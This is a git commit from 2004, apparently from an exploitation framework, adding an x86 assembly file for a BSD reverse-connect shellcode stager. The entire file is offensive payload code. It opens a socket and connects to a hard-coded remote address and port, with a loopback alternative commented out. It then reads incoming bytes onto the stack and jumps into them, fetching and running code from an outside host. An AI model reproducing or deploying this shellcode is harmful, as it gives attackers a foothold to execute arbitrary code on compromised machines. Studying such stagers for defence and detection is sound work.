3463d2883655e6780990e8d63aadd3412473be4f
Matt Miller <mmiller@hick.org>
2004-11-14 06:57:00 +0000

    bsd stager start

---
+++ src/shellcode/bsd/ia32/stager_sock_reverse.asm
@@ -0,0 +1,37 @@
+BITS   32
+GLOBAL main
+
+main:
+
+socket:
+	push byte 97
+	pop  eax
+	cdq
+	push edx
+	inc  edx
+	push edx
+	inc  edx
+	push edx
+	push edx
+	int  0x80
+
+connect:
+	pop  edx
+;	push 0x0100007f
+	push 0x0400fe0a
+	push word 0xbfbf
+	push dx
+	mov  ecx, esp
+	push byte 0x10
+	push ecx
+	push eax
+	push ecx
+	push byte 98
+	pop  eax
+	int  0x80
+
+read:
+	mov  al, 0x3
+	mov  byte [ecx - 0x3], 0x10
+	int  0x80
+	ret
